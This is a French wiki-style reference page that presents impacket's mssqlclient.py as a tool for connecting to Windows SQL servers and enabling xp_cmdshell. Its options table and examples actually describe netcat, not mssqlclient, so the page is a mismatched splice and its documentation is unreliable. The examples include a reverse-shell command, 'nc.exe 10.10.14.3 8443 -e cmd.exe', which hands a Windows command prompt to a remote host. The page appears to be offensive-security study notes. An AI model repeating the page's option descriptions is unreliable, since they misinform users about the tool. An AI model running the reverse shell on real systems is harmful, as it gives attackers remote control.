---
title: mssqlclient
description: mssqlclient est un programme python permettant de se connecter à un serveur SQL Windows. Il permet d'activer facilement l'option xp_cmdshell avec une simple commande, ce qui permet l'exécution de commandes depuis le client SQL.
published: true
date: 2024-07-13T09:21:17.857Z
tags: windows
editor: markdown
dateCreated: 2024-07-13T09:21:17.856Z
---



# Introduction

mssqlclient est un script python permettant de se connecter à un serveur SQL Windows. Il permet d'activer facilement l'option xp_cmdshell avec une simple commande, ce qui permet l'exécution de commandes depuis le client SQL.

> mssqlclient est disponible au téléchargement ici: https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py
{.is-info}



# Syntaxe

`mssqlclient.py [domaine/utilisateur:mot de passe]@[Adresse] [options]`

# Options

| Option          | Description                                                         |
| --------------- | ------------------------------------------------------------------- |
| `-l`            | Mode écoute (listen), attendre une connexion entrante               |
| `-v`            | Mode verbose, affiche des informations supplémentaires              |
| `-p [port]`     | Spécifie un port d'écoute et aussi là où la connexion est transmise |
| `-e [commande]` | Spécifie la commande à éxectuer lorsqu'une transmission est établie |

# Exemples

Écoute sur sur le port 8080

`nc.exe -l -p 8080`

Envoi une connexion vers l'ip 10.10.14.3 sur le port 8443 qui éxecutera "cmd.exe" lors de l'établissement de la connexion

`nc.exe 10.10.14.3 8443 -e cmd.exe`
